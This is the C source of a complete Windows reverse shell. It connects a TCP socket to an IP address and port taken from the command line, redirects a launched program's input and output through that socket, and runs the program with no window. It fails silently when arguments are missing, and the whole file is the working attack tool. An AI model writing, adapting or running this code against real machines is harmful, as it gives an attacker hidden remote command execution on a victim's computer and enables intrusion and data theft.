#include <WinSock2.h>
#include <Windows.h>
#include <tchar.h>
#include <WS2tcpip.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,	_In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow) {

	LPWSTR* argList;
	int nArgs;

	//grabbing command line arguments
	argList = CommandLineToArgvW(GetCommandLineW(), &nArgs);

	//checking for number of command line arguments, if none are provided the program fails silently
	if (nArgs != 4) {
		LocalFree(argList);
		return EXIT_FAILURE;
	}


	WSADATA wsa;
	struct sockaddr_in server_address = {0};
	STARTUPINFO sui = {0};
	PROCESS_INFORMATION pi = {0};
	int result = WSAStartup(MAKEWORD(2, 2), &wsa);
	
	if (result != 0) {
		LocalFree(argList);
		return EXIT_FAILURE;
	}
	
	const SOCKET client_socket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL,(unsigned int)NULL);

	if (client_socket == INVALID_SOCKET) {
		LocalFree(argList);
		WSACleanup();
		return EXIT_FAILURE;
	}

	server_address.sin_family = AF_INET;
	server_address.sin_port = htons(_wtoi(argList[3]));
	unsigned long server_ip_address;
	InetPton(AF_INET, (argList[2]), &server_ip_address);
	server_address.sin_addr.S_un.S_addr = server_ip_address;

	result = connect(client_socket, (SOCKADDR*)& server_address, sizeof(server_address)); 

	if (result == SOCKET_ERROR) {

		LocalFree(argList);
		closesocket(client_socket);
		WSACleanup();
		return EXIT_FAILURE;
	}

	memset(&sui, 0, sizeof(sui));
	sui.cb = sizeof(sui);
	sui.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
	sui.hStdInput = (HANDLE)client_socket;
	sui.hStdOutput = (HANDLE)client_socket;
	sui.hStdError = (HANDLE)client_socket;

	if (!CreateProcess(NULL, argList[1], NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sui, &pi))
	{
		LocalFree(argList);
		closesocket(client_socket);
		WSACleanup();
		return EXIT_FAILURE;
	}

	// If you want to keep this process alive until the cmd is finished then uncomment this
	// WaitForSingleObject(pi.hProcess, INFINITE);
	
	//Closing socket, handles and freeing arguments from memory
	
	LocalFree(argList);
	closesocket(client_socket);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);       //Avoid Leaking process information handle.

	return EXIT_SUCCESS;
}
